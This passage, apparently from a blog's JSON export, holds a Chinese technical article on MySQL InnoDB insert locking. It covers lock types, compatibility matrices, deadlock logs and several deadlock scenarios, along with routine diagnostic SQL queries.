        25 |         4 |        5 | 22, 11    |\n| 36832:25:4:5 | 36832       | X,GAP     | RECORD    | `test`.`t` | idx_b      |         25 |         4 |        5 | 22, 11    |\n+--------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+\n```\n\n\n#### 死锁日志\n```\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n2016-07-28 12:28:34 700000a3f000\n*** (1) TRANSACTION:\nTRANSACTION 36831, ACTIVE 17 sec inserting\nmysql tables in use 1, locked 1\nLOCK WAIT 4 lock struct(s), heap size 1184, 3 row lock(s), undo log entries 1\nMySQL thread id 38, OS thread handle 0x700000b0b000, query id 953 localhost root update\ninsert into t values (4,5)\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 25 page no 4 n bits 72 index `idx_b` of table `test`.`t` trx id 36831 lock_mode X locks gap before rec insert intention waiting\nRecord lock, heap no 5 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000016; asc     ;;\n 1: len 4; hex 8000000b; asc     ;;\n\n*** (2) TRANSACTION:\nTRANSACTION 36832, ACTIVE 13 sec inserting\nmysql tables in use 1, locked 1\n3 lock struct(s), heap size 360, 2 row lock(s)\nMySQL thread id 39, OS thread handle 0x700000a3f000, query id 954 localhost root update\ninsert into t values (4,5)\n*** (2) HOLDS THE LOCK(S):\nRECORD LOCKS space id 25 page no 4 n bits 72 index `idx_b` of table `test`.`t` trx id 36832 lock_mode X locks gap before rec\nRecord lock, heap no 5 PHYSICAL RECORD: n_fields 2; compact format; info bits 0\n 0: len 4; hex 80000016; asc     ;;\n 1: len 4; hex 8000000b; asc     ;;\n\n*** (2) WAITING FOR THIS LOCK TO BE GRANTED:\nRECORD LOCKS space id 25 page no 3 n bits 72 index `PRIMARY` of table `test`.`t` trx id 36832 lock mode S locks rec but not gap waiting\nRecord lock, heap no 5 PHYSICAL RECORD: n_fields 4; compact format; info bits 0\n 0: len 4; hex 80000004; asc     ;;\n 1: len 6; hex 000000008fdf; asc       ;;\n 2: len 7; hex 8d000001d00110; asc        ;;\n 3: len 4; hex 80000005; asc     ;;\n\n*** WE ROLL BACK TRANSACTION (2)\n```\n\n\n#### 死锁成因\n事务T1执行查询语句，在索引b=6上加排他Next-key锁(LOCK_X | LOCK_ORDINARY)，会锁住idx_b索引范围(4, 22)。\n事务T2执行查询语句，在索引b=8上加排他Next-key锁(LOCK_X | LOCK_ORDINARY)，会锁住idx_b索引范围(4, 22)。由于请求的GAP与已持有的GAP是兼容的，因此，事务T2在idx_b索引范围(4, 22)也能加锁成功。\n\n事务T1执行插入语句，会先加排他Insert Intention锁。由于请求的Insert Intention锁与已有的GAP锁不兼容，则事务T1等待T2释放GAP锁。\n事务T2执行插入语句，也会等待T1释放GAP锁。\n于是，死锁便产生了。\n\n**注**：LOCK_ORDINARY拥有LOCK_GAP一部分特性。\n\n\n#### 思考：Insert Intention锁在加哪级索引上？\n这个排他锁加在PK上，还是二级索引上？\n\n\n## 六、课后思考\n1. 无主键的加锁过程\n无PK时，会创建一个隐式聚簇索引。加锁在这个隐式聚簇索引会有什么不同？\n\n2. 复合索引加锁过程\n3. 多条件(where condition)加锁过程\n4. 隐式锁与显式锁，隐式锁什么情况下会转换成显式锁\n\n5. 如果插入意向锁不阻止任何锁，这个锁还有必要存在吗？\n目前看到的作用是，通过加锁的方式来唤醒等待线程。\n但这并不意味着，被唤醒后可以直接做插入操作了。需要再次判断是否有锁冲突。\n\n\n## 七、补充知识\n\n### 1. 查看事务隔离级别\nSELECT @@global.tx_isolation;\nSELECT @@session.tx_isolation;\nSELECT @@tx_isolation;\n\n### 2. 设置隔离级别\nSET [SESSION | GLOBAL] TRANSACTION ISOLATION LEVEL {READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE}\n例如：set session transaction isolation level read uncommitted;\n\n### 3. 查看auto_increment机制模式\nshow variables like 'innodb_autoinc_lock_mode';\n\n### 4. 查看表状态\nshow table status like 'plan_branch'\\G;\nshow table status from test like 'plan_branch'\\G;\n\n### 5. 查看SQL性能\nshow profiles\nshow profile for query 1;\n\n### 6. 查看当前最新事务ID\n每开启一个新事务，记录当前最新事务的id，可用于后续死锁分析。\nshow engine innodb status\\G;\n\n### 7. 查看事务锁等待状态情况\nselect * from information_schema.innodb_locks;\nselect * from information_schema.innodb_lock_waits;\nselect * from information_schema.innodb_trx;\n\n### 8. 查看innodb状态(包含最近的死锁日志)\nshow engine innodb status;\n\n\n## 八、参考文档\n[^1]: [InnoDB Startup Options and System Variables](https://dev.mysql.com/doc/refman/5.6/en/innodb-parameters.html)\n[^2]: [InnoDB Locking](http://dev.mysql.com/doc/refman/5.6/en/innodb-locking.html)\n[^3]: [Clustered and Secondary Indexes](http://dev.mysql.com/doc/refman/5.6/en/innodb-index-types.html)\n[^4]: [[MySQL] gap lock/next-key lock浅析](http://www.cnblogs.com/renolei/p/4673842.html)\n[^5]: [Intention Lock是否表级锁](http://hedengcheng.com/?p=771#comment-5543)\n[^6]: [Locks Set by Different SQL Statements in InnoDB](http://dev.mysql.com/doc/refman/5.6/en/innodb-locks-set.html)\n[^7]: [一个Mysql的死锁现象，及复现过程](http://feiyang21687.github.io/Mysql-Transaction/)\n[^8]: [AUTO_INCREMENT lock Handing in InnoDB](http://www.cnblogs.com/renolei/p/5559135.html)\n[^9]: [深入理解innodb的锁(record,gap,Next-Key lock)](http://blog.csdn.net/cug_jiang126com/article/details/50596729)\n[^10]: [information_schema中Innodb相关表用于分析sql查询锁的使用情况介绍](http://blog.csdn.net/and1kaney/article/details/51213979)\n[^11]: [The INFORMATION_SCHEMA INNODB_LOCKS Table](http://dev.mysql.com/doc/refman/5.5/en/innodb-locks-table.html)\n[^12]: [The INFORMATION_SCHEMA INNODB_TRX Table](http://dev.mysql.com/doc/refman/5.5/en/innodb-trx-table.html)\n[^13]: [mysql innodb插入意向锁](http://blog.csdn.net/yanzongshuai/article/details/46398609)\n\n","slug":"article/database/mysql insert锁机制","published":1,"updated":"2016-08-20T07:13:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cis6vlxr600235nbtiw48vg3f","content":"<p><img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\"></p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>上周遇到一个因insert而引发的死锁问题，其成因比较令人费解。<br>于是想要了解一下insert加锁机制，但是发现网上介绍的文章比较少且零散，挖掘过程比较忙乱。</p>\n<p>本以为只需要系统学习一个较完全的逻辑，但是实际牵扯很多innodb锁相关知识及加锁方式。我好像并没有那么大的能耐，把各种场景的加锁过程一一列举并加之分析；亦没有太多的精力验证网上的言论的准确性。</p>\n<p>只好根据现在了解的内容，参考官方文档，说说自己当前的理解。<br>本文仅供参考，如有误导，概不负责。</p>\n<h2 id=\"二、现场状态\"><a href=\"#二、现场状态\" class=\"headerlink\" title=\"二、现场状态\"></a>二、现场状态</h2><p>不同的mysql版本，不同的参数设置，都可能对加锁过程有影响。<br>分析加锁机制还是应当尽可能多地列举一下关键参数，例如：当前mysql版本、事务隔离级别等。<br>如下，仅仅只列出个别比较重要的参数。</p>\n<h3 id=\"1-数据库版本\"><a href=\"#1-数据库版本\" class=\"headerlink\" title=\"1.数据库版本\"></a>1.数据库版本</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select version();</div><div class=\"line\">+-----------+</div><div class=\"line\">| version() |</div><div class=\"line\">+-----------+</div><div class=\"line\">| 5.6.27    |</div><div class=\"line\">+-----------+</div></pre></td></tr></table></figure>\n<h3 id=\"2-数据库引擎\"><a href=\"#2-数据库引擎\" class=\"headerlink\" title=\"2. 数据库引擎\"></a>2. 数据库引擎</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; show variables like <span class=\"string\">'%engine%'</span>;</div><div class=\"line\">+----------------------------+--------+</div><div class=\"line\">| Variable_name              | Value  |</div><div class=\"line\">+----------------------------+--------+</div><div class=\"line\">| default_storage_engine     | InnoDB |</div><div class=\"line\">| default_tmp_storage_engine | InnoDB |</div><div class=\"line\">| storage_engine             | InnoDB |</div><div class=\"line\">+----------------------------+--------+</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：InnoDB支持事务，Myisam不支持事务；InnoDB支持行锁和表锁；Myisam不支持行锁。</p>\n<h3 id=\"3-事务隔离级别\"><a href=\"#3-事务隔离级别\" class=\"headerlink\" title=\"3. 事务隔离级别\"></a>3. 事务隔离级别</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select @@global.tx_isolation, @@session.tx_isolation, @@tx_isolation;</div><div class=\"line\">+-----------------------+------------------------+-----------------+</div><div class=\"line\">| @@global.tx_isolation | @@session.tx_isolation | @@tx_isolation  |</div><div class=\"line\">+-----------------------+------------------------+-----------------+</div><div class=\"line\">| REPEATABLE-READ       | REPEATABLE-READ        | REPEATABLE-READ |</div><div class=\"line\">+-----------------------+------------------------+-----------------+</div></pre></td></tr></table></figure>\n<p><strong>注</strong>：几种事务隔离级别：READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE</p>\n<h3 id=\"4-查看gap锁开启状态\"><a href=\"#4-查看gap锁开启状态\" class=\"headerlink\" title=\"4. 查看gap锁开启状态\"></a>4. 查看gap锁开启状态</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; show variables like <span class=\"string\">'innodb_locks_unsafe_for_binlog'</span>;</div><div class=\"line\">+--------------------------------+-------+</div><div class=\"line\">| Variable_name                  | Value |</div><div class=\"line\">+--------------------------------+-------+</div><div class=\"line\">| innodb_locks_unsafe_<span class=\"keyword\">for</span>_binlog | OFF   |</div><div class=\"line\">+--------------------------------+-------+</div></pre></td></tr></table></figure>\n<p>innodb_locks_unsafe_for_binlog：默认值为0，即启用gap lock。<br>最主要的作用就是控制innodb是否对gap加锁。<br>但是，这一设置变更并不影响外键和唯一索引（含主键）对gap进行加锁的需要。<br>开启innodb_locks_unsafe_for_binlog的REPEATABLE-READ事务隔离级别，很大程度上已经蜕变成了READ-COMMITTED。</p>\n<p>参见官方文档[^1]：</p>\n<blockquote>\n<p>By default, the value of innodb_locks_unsafe_for_binlog is 0 (disabled), which means that gap locking is enabled: InnoDB uses next-key locks for searches and index scans. To enable the variable, set it to 1. This causes gap locking to be disabled: InnoDB uses only index-record locks for searches and index scans.</p>\n<p>Enabling innodb_locks_unsafe_for_binlog does not disable the use of gap locking for foreign-key constraint checking or duplicate-key checking.</p>\n<p>The effect of enabling innodb_locks_unsafe_for_binlog is similar to but not identical to setting the transaction isolation level to READ COMMITTED.</p>\n</blockquote>\n<h3 id=\"5-查看自增锁模式\"><a href=\"#5-查看自增锁模式\" class=\"headerlink\" title=\"5. 查看自增锁模式\"></a>5. 查看自增锁模式</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; show variables like <span class=\"string\">'innodb_autoinc_lock_mode'</span>;</div><div class=\"line\">+--------------------------+-------+</div><div class=\"line\">| Variable_name            | Value |</div><div class=\"line\">+--------------------------+-------+</div><div class=\"line\">| innodb_autoinc_lock_mode | 1     |</div><div class=\"line\">+--------------------------+-------+</div></pre></td></tr></table></figure>\n<p>innodb_autoinc_lock_mode有3种配置模式：0、1、2，分别对应”传统模式”, “连续模式”, “交错模式”。[^8]<br>传统模式：涉及auto-increment列的插入语句加的表级AUTO-INC锁，只有插入执行结束后才会释放锁。这是一种兼容MySQL 5.1之前版本的策略。<br>连续模式：可以事先确定插入行数的语句(包括单行和多行插入)，分配连续的确定的auto-increment值；对于插入行数不确定的插入语句，仍加表锁。这种模式下，事务回滚，auto-increment值不会回滚，换句话说，自增列内容会不连续。<br>交错模式：同一时刻多条SQL语句产生交错的auto-increment值。</p>\n<p>由于insert语句常常涉及自增列的加锁过程，会涉及到AUTO-INC Locks加锁过程。<br>为了分步了解insert加锁过程，本文暂不讨论任何涉及自增列的加锁逻辑。<br>这一参数设置相关内容可能会出现在我的下一篇文章里。</p>\n<a id=\"more\"></a>\n<h3 id=\"n-etc\"><a href=\"#n-etc\" class=\"headerlink\" title=\"n. etc\"></a>n. etc</h3><p>相关的参数配置越详情越好。</p>\n<h2 id=\"三、InnoDB锁类型-2\"><a href=\"#三、InnoDB锁类型-2\" class=\"headerlink\" title=\"三、InnoDB锁类型[^2]\"></a>三、InnoDB锁类型[^2]</h2><h3 id=\"1-基本锁\"><a href=\"#1-基本锁\" class=\"headerlink\" title=\"1. 基本锁\"></a>1. 基本锁</h3><p>基本锁：共享锁(Shared Locks：S锁)与排他锁(Exclusive Locks：X锁)</p>\n<p>mysql允许拿到S锁的事务读一行，允许拿到X锁的事务更新或删除一行。<br>加了S锁的记录，允许其他事务再加S锁，不允许其他事务再加X锁；<br>加了X锁的记录，不允许其他事务再加S锁或者X锁。</p>\n<p>mysql对外提供加这两种锁的语法如下：<br>加S锁：select…lock in share mode<br>加X锁：select…for update</p>\n<h3 id=\"2-意向锁-Intention-Locks\"><a href=\"#2-意向锁-Intention-Locks\" class=\"headerlink\" title=\"2. 意向锁(Intention Locks)\"></a>2. 意向锁(Intention Locks)</h3><p>InnoDB为了支持多粒度(表锁与行锁)的锁并存，引入意向锁。<br>意向锁是表级锁，可分为意向共享锁(IS锁)和意向排他锁(IX锁)。</p>\n<blockquote>\n<p>InnoDB supports multiple granularity locking which permits coexistence of row-level locks and locks on entire tables. To make locking at multiple granularity levels practical, additional types of locks called intention locks are used. Intention locks are table-level locks in InnoDB that indicate which type of lock (shared or exclusive) a transaction will require later for a row in that table. There are two types of intention locks used in InnoDB (assume that transaction T has requested a lock of the indicated type on table t):<br>Intention shared (IS): Transaction T intends to set S locks on individual rows in table t.<br>Intention exclusive (IX): Transaction T intends to set X locks on those rows.</p>\n</blockquote>\n<p>事务在请求S锁和X锁前，需要先获得对应的IS、IX锁。</p>\n<blockquote>\n<p>Before a transaction can acquire an S lock on a row in table t, it must first acquire an IS or stronger lock on t. Before a transaction can acquire an X lock on a row, it must first acquire an IX lock on t.</p>\n</blockquote>\n<p>意向锁产生的主要目的是为了处理行锁和表锁之间的冲突，用于表明“某个事务正在某一行上持有了锁，或者准备去持有锁”。</p>\n<blockquote>\n<p>The main purpose of IX and IS locks is to show that someone is locking a row, or going to lock a row in the table.</p>\n</blockquote>\n<p>共享锁、排他锁与意向锁的兼容矩阵如下：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">X</th>\n<th style=\"text-align:center\">IX</th>\n<th style=\"text-align:center\">S</th>\n<th style=\"text-align:center\">IS</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">X</td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">IX</td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\">兼容</td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\">兼容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">S</td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\">兼容</td>\n<td style=\"text-align:center\">兼容</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">IS</td>\n<td style=\"text-align:center\"><code>冲突</code></td>\n<td style=\"text-align:center\">兼容</td>\n<td style=\"text-align:center\">兼容</td>\n<td style=\"text-align:center\">兼容</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"思考\"><a href=\"#思考\" class=\"headerlink\" title=\"思考\"></a>思考</h4><p>从官方文档字面意思上看意向锁是表级锁，但是大牛<strong>不认为</strong>“Intention lock 是表级锁”[^5]?<br>另外，由于意向锁主要用于解决行锁与表锁间冲突问题，鉴于平时表级操作特别少，在分析加锁过程是否可以不用过多考虑意向锁的问题?</p>\n<h3 id=\"3-行锁\"><a href=\"#3-行锁\" class=\"headerlink\" title=\"3. 行锁\"></a>3. 行锁</h3><h4 id=\"记录锁-Record-Locks\"><a href=\"#记录锁-Record-Locks\" class=\"headerlink\" title=\"记录锁(Record Locks)\"></a>记录锁(Record Locks)</h4><p>记录锁, 仅仅锁住索引记录的一行。<br>单条索引记录上加锁，record lock锁住的永远是索引，而非记录本身，即使该表上没有任何索引，那么innodb会在后台创建一个隐藏的聚集主键索引，那么锁住的就是这个隐藏的聚集主键索引。所以说当一条sql没有走任何索引时，那么将会在每一条聚集索引后面加X锁，这个类似于表锁，但原理上和表锁应该是完全不同的。</p>\n<p>参见官方文档[^3]：</p>\n<blockquote>\n<p>If the table has no PRIMARY KEY or suitable UNIQUE index, InnoDB internally generates a hidden clustered index on a synthetic column containing row ID values. The rows are ordered by the ID that InnoDB assigns to the rows in such a table. The row ID is a 6-byte field that increases monotonically as new rows are inserted. Thus, the rows ordered by the row ID are physically in insertion order.</p>\n</blockquote>\n<h4 id=\"间隙锁-Gap-Locks\"><a href=\"#间隙锁-Gap-Locks\" class=\"headerlink\" title=\"间隙锁(Gap Locks)\"></a>间隙锁(Gap Locks)</h4><p>区间锁, 仅仅锁住一个索引区间(开区间)。<br>在索引记录之间的间隙中加锁，或者是在某一条索引记录之前或者之后加锁，并不包括该索引记录本身。</p>\n<h4 id=\"next-key锁-Next-Key-Locks\"><a href=\"#next-key锁-Next-Key-Locks\" class=\"headerlink\" title=\"next-key锁(Next-Key Locks)\"></a>next-key锁(Next-Key Locks)</h4><p>record lock + gap lock, 左开右闭区间。</p>\n<blockquote>\n<p>A next-key lock is a combination of a record lock on the index record and a gap lock on the gap before the index record.</p>\n<p>By default, InnoDB operates in REPEATABLE READ transaction isolation level and with the innodb_locks_unsafe_for_binlog system variable disabled. In this case, InnoDB uses next-key locks for searches and index scans, which prevents phantom rows。</p>\n</blockquote>\n<p>默认情况下，innodb使用next-key locks来锁定记录。<br>但当查询的索引含有唯一属性的时候，Next-Key Lock 会进行优化，将其降级为Record Lock，即仅锁住索引本身，不是范围。</p>\n<h4 id=\"插入意向锁-Insert-Intention-Locks\"><a href=\"#插入意向锁-Insert-Intention-Locks\" class=\"headerlink\" title=\"插入意向锁(Insert Intention Locks)\"></a>插入意向锁(Insert Intention Locks)</h4><p>Gap Lock中存在一种插入意向锁（Insert Intention Lock），在insert操作时产生。在多事务同时写入不同数据至同一索引间隙的时候，并不需要等待其他事务完成，不会发生锁等待。<br>假设有一个记录索引包含键值4和7，不同的事务分别插入5和6，每个事务都会产生一个加在4-7之间的插入意向锁，获取在插入行上的排它锁，但是不会被互相锁住，因为数据行并不冲突。</p>\n<blockquote>\n<p>An insert intention lock is a type of gap lock set by INSERT operations prior to row insertion. This lock signals the intent to insert in such a way that multiple transactions inserting into the same index gap need not wait for each other if they are not inserting at the same position within the gap. Suppose that there are index records with values of 4 and 7. Separate transactions that attempt to insert values of 5 and 6, respectively, each lock the gap between 4 and 7 with insert intention locks prior to obtaining the exclusive lock on the inserted row, but do not block each other because the rows are nonconflicting.</p>\n</blockquote>\n<p><strong>注</strong>：插入意向锁并非意向锁，而是一种特殊的间隙锁。</p>\n<h3 id=\"4-行锁的兼容矩阵-4\"><a href=\"#4-行锁的兼容矩阵-4\" class=\"headerlink\" title=\"4. 行锁的兼容矩阵[^4]\"></a>4. 行锁的兼容矩阵[^4]</h3><table>\n<thead>\n<tr>\n<th></th>\n<th>Gap</th>\n<th>Insert Intention</th>\n<th>Record</th>\n<th>Next-Key</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Gap</strong></td>\n<td>兼容</td>\n<td>兼容</td>\n<td>兼容</td>\n<td>兼容</td>\n</tr>\n<tr>\n<td><strong>Insert Intention</strong></td>\n<td><code>冲突</code></td>\n<td>兼容</td>\n<td>兼容</td>\n<td><code>冲突</code></td>\n</tr>\n<tr>\n<td><strong>Record</strong></td>\n<td>兼容</td>\n<td>兼容</td>\n<td><code>冲突</code></td>\n<td><code>冲突</code></td>\n</tr>\n<tr>\n<td><strong>Next-Key</strong></td>\n<td>兼容</td>\n<td>兼容</td>\n<td><code>冲突</code></td>\n<td><code>冲突</code></td>\n</tr>\n</tbody>\n</table>\n<p><strong>表注</strong>：横向是已经持有的锁，纵向是正在请求的锁。</p>\n<p>由于S锁和S锁是完全兼容的，因此在判别兼容性时只考虑持有的锁与请求的锁是这三种组合情形：X、S和S、X和X、X。<br>另外，需要提醒注意的是进行兼容判断也只是针对于加锁涉及的行有交集的情形。</p>\n<p>分析兼容矩阵可以得出如下几个结论：</p>\n<ul>\n<li>INSERT操作之间不会有冲突。</li>\n<li>GAP,Next-Key会阻止Insert。</li>\n<li>GAP和Record,Next-Key不会冲突</li>\n<li>Record和Record、Next-Key之间相互冲突。</li>\n<li>已有的Insert锁不阻止任何准备加的锁。</li>\n</ul>\n<h3 id=\"5-自增锁-AUTO-INC-Locks\"><a href=\"#5-自增锁-AUTO-INC-Locks\" class=\"headerlink\" title=\"5. 自增锁(AUTO-INC Locks)\"></a>5. 自增锁(AUTO-INC Locks)</h3><p>AUTO-INC锁是一种特殊的表级锁，发生涉及AUTO_INCREMENT列的事务性插入操作时产生。</p>\n<p>官方解释如下[^3]：</p>\n<blockquote>\n<p>An AUTO-INC lock is a special table-level lock taken by transactions inserting into tables with AUTO_INCREMENT columns. In the simplest case, if one transaction is inserting values into the table, any other transactions must wait to do their own inserts into that table, so that rows inserted by the first transaction receive consecutive primary key values.</p>\n</blockquote>\n<h2 id=\"四、insert加锁过程\"><a href=\"#四、insert加锁过程\" class=\"headerlink\" title=\"四、insert加锁过程\"></a>四、insert加锁过程</h2><p>官方文档[^6]对于insert加锁的描述如下：</p>\n<blockquote>\n<p>INSERT sets an exclusive lock on the inserted row. This lock is an index-record lock, not a next-key lock (that is, there is no gap lock) and does not prevent other sessions from inserting into the gap before the inserted row.</p>\n<p>Prior to inserting the row, a type of gap lock called an insert intention gap lock is set. This lock signals the intent to insert in such a way that multiple transactions inserting into the same index gap need not wait for each other if they are not inserting at the same position within the gap. Suppose that there are index records with values of 4 and 7. Separate transactions that attempt to insert values of 5 and 6 each lock the gap between 4 and 7 with insert intention locks prior to obtaining the exclusive lock on the inserted row, but do not block each other because the rows are nonconflicting.</p>\n<p>If a duplicate-key error occurs, a shared lock on the duplicate index record is set. This use of a shared lock can result in deadlock should there be multiple sessions trying to insert the same row if another session already has an exclusive lock.</p>\n</blockquote>\n<p>简单的insert会在insert的行对应的索引记录上加一个排它锁，这是一个record lock，并没有gap，所以并不会阻塞其他session在gap间隙里插入记录。</p>\n<p>不过在insert操作之前，还会加一种锁，官方文档称它为insertion intention gap lock，也就是意向的gap锁。这个意向gap锁的作用就是预示着当多事务并发插入相同的gap空隙时，只要插入的记录不是gap间隙中的相同位置，则无需等待其他session就可完成，这样就使得insert操作无须加真正的gap lock。<br>假设有一个记录索引包含键值4和7，不同的事务分别插入5和6，每个事务都会产生一个加在4-7之间的插入意向锁，获取在插入行上的排它锁，但是不会被互相锁住，因为数据行并不冲突。</p>\n<p>假设发生了一个唯一键冲突错误，那么将会在重复的索引记录上加读锁。当有多个session同时插入相同的行记录时，如果另外一个session已经获得该行的排它锁，那么将会导致死锁。</p>\n<h3 id=\"思考：Insert-Intention-Locks作用\"><a href=\"#思考：Insert-Intention-Locks作用\" class=\"headerlink\" title=\"思考：Insert Intention Locks作用\"></a>思考：Insert Intention Locks作用</h3><p>Insert Intention Locks的引入，我理解是为了提高数据插入的并发能力。<br>如果没有Insert Intention Locks的话，可能就需要使用Gap Locks来代替。</p>\n<h2 id=\"五、insert死锁场景分析\"><a href=\"#五、insert死锁场景分析\" class=\"headerlink\" title=\"五、insert死锁场景分析\"></a>五、insert死锁场景分析</h2><p>接下来，带大家看几个与insert相关的死锁场景。</p>\n<h3 id=\"1-duplicate-key-error引发的死锁\"><a href=\"#1-duplicate-key-error引发的死锁\" class=\"headerlink\" title=\"1. duplicate key error引发的死锁\"></a>1. duplicate key error引发的死锁</h3><p>这个场景主要发生在两个以上的事务同时进行唯一键值相同的记录插入操作。</p>\n<h4 id=\"表结构\"><a href=\"#表结构\" class=\"headerlink\" title=\"表结构\"></a>表结构</h4><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> <span class=\"string\">`aa`</span> (</div><div class=\"line\">  <span class=\"string\">`id`</span> <span class=\"built_in\">int</span>(<span class=\"number\">10</span>) <span class=\"keyword\">unsigned</span> <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'主键'</span>,</div><div class=\"line\">  <span class=\"string\">`name`</span> <span class=\"built_in\">varchar</span>(<span class=\"number\">20</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">''</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'姓名'</span>,</div><div class=\"line\">  <span class=\"string\">`age`</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">'0'</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'年龄'</span>,</div><div class=\"line\">  <span class=\"string\">`stage`</span> <span class=\"built_in\">int</span>(<span class=\"number\">11</span>) <span class=\"keyword\">NOT</span> <span class=\"literal\">NULL</span> <span class=\"keyword\">DEFAULT</span> <span class=\"string\">'0'</span> <span class=\"keyword\">COMMENT</span> <span class=\"string\">'关卡数'</span>,</div><div class=\"line\">  PRIMARY <span class=\"keyword\">KEY</span> (<span class=\"string\">`id`</span>),</div><div class=\"line\">  <span class=\"keyword\">UNIQUE</span> <span class=\"keyword\">KEY</span> <span class=\"string\">`udx_name`</span> (<span class=\"string\">`name`</span>),</div><div class=\"line\">  <span class=\"keyword\">KEY</span> <span class=\"string\">`idx_stage`</span> (<span class=\"string\">`stage`</span>)</div><div class=\"line\">) <span class=\"keyword\">ENGINE</span>=<span class=\"keyword\">InnoDB</span> <span class=\"keyword\">DEFAULT</span> <span class=\"keyword\">CHARSET</span>=utf8;</div></pre></td></tr></table></figure>\n<h4 id=\"表数据\"><a href=\"#表数据\" class=\"headerlink\" title=\"表数据\"></a>表数据</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">mysql&gt; select * from aa;</div><div class=\"line\">+----+------+-----+-------+</div><div class=\"line\">| id | name | age | stage |</div><div class=\"line\">+----+------+-----+-------+</div><div class=\"line\">|  1 | yst  |  11 |     8 |</div><div class=\"line\">|  2 | dxj  |   7 |     4 |</div><div class=\"line\">|  3 | lb   |  13 |     7 |</div><div class=\"line\">|  4 | zsq  |   5 |     7 |</div><div class=\"line\">|  5 | lxr  |  13 |     4 |</div><div class=\"line\">+----+------+-----+-------+</div></pre></td></tr></table></figure>\n<h4 id=\"事务执行时序表\"><a href=\"#事务执行时序表\" class=\"headerlink\" title=\"事务执行时序表\"></a>事务执行时序表</h4><table>\n<thead>\n<tr>\n<th>T1(36727)</th>\n<th>T2(36728)</th>\n<th>T3(36729)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>begin;</td>\n<td>begin;</td>\n<td>begin;</td>\n</tr>\n<tr>\n<td>insert into aa values(6, ‘test’, 12, 3);</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>insert into aa values(6, ‘test’, 12, 3);</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>insert into aa values(6, ‘test’, 12, 3);</td>\n</tr>\n<tr>\n<td>rollback;</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction</td>\n</tr>\n<tr>\n<td></td>\n<td>Query OK, 1 row affected (13.10 